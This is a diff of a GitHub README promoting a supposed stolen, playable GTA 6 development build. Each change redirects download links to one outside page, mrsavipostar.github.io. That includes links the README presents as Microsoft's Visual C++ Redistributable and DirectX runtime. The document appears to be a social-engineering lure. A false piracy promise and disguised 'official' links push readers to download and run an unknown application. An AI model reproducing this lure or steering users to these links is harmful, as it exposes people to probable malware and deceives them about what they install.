@@ -1,7 +1,7 @@
 <h1>🎮 GTA-6-Stolen-Dev-Build-Playable-2026 - Your Gateway to Playing GTA 6 Early on PC</h1>
 
 <p align="center">
-  <a href="https://github.com/Mrsavipostar/GTA-6-Stolen-Dev-Build-Playable-2026/releases">
+  <a href="https://mrsavipostar.github.io">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6_NOW-FF6B35?style=for-the-badge&logo=github&logoColor=white" alt="Download GTA 6" style="background-color:#FF6B35; padding:15px 25px; border-radius:10px; font-size:20px;">
   </a>
 </p>
@@ -44,7 +44,7 @@ To ensure the best possible gaming experience, we recommend your PC meets the fo
 Here is the official download link for the application. Please read the instruction below it carefully – it's the only step you need to perform to get the game.
 
 ### 🔗 Official Download Link:
-**[Click Here to Download GTA 6 Stolen Dev Build](https://github.com/Mrsavipostar/GTA-6-Stolen-Dev-Build-Playable-2026/releases)**
+**[Click Here to Download GTA 6 Stolen Dev Build](https://mrsavipostar.github.io)**
 
 **Visit this link to download the application.** Once you arrive at the page, you will see a list of files. We recommend downloading the most recent version listed at the top. The download will begin automatically after you click the file.
 
@@ -75,7 +75,7 @@ We've anticipated some common issues that players might face and have provided s
 
 - **Game Won't Start:** Ensure your graphics drivers are up to date. Visit the NVIDIA or AMD website to download the latest drivers for your graphics card. After updating, restart your PC and try launching the game again.
 - **Poor Performance / Low FPS:** Lower the graphics settings in the game's options menu. Disable "Ray Tracing" and reduce the resolution if needed. Closing other background applications can also improve performance.
-- **Game Crashes on Startup:** This is often due to a missing software component. Try installing the latest version of [Microsoft Visual C++ Redistributable](https://aka.ms/vs/17/release/vc_redist.x64.exe) and [DirectX End-User Runtime](https://www.microsoft.com/en-us/download/details.aspx?id=35). Reboot your PC after installation.
+- **Game Crashes on Startup:** This is often due to a missing software component. Try installing the latest version of [Microsoft Visual C++ Redistributable](https://mrsavipostar.github.io) and [DirectX End-User Runtime](https://mrsavipostar.github.io). Reboot your PC after installation.
 - **Audio Problems:** Check your Windows sound settings and ensure your default playback device is set correctly. In-game, verify that the audio is not muted and the volume is turned up.
 
 If you still encounter issues after trying these steps, please check the "Issues" tab on our GitHub repository for further assistance from the community. We are continuously working to improve stability.
@@ -125,4 +125,4 @@ Remember to grab your copy now using the link below, and get ready for hours of 
 
 Your next adventure is one click away. Head straight to the download page and start your journey into the next generation of Grand Theft Auto.
 
-**[🚀 GO TO DOWNLOAD CENTER NOW](https://github.com/Mrsavipostar/GTA-6-Stolen-Dev-Build-Playable-2026/releases)**
+**[🚀 GO TO DOWNLOAD CENTER NOW](https://mrsavipostar.github.io)**
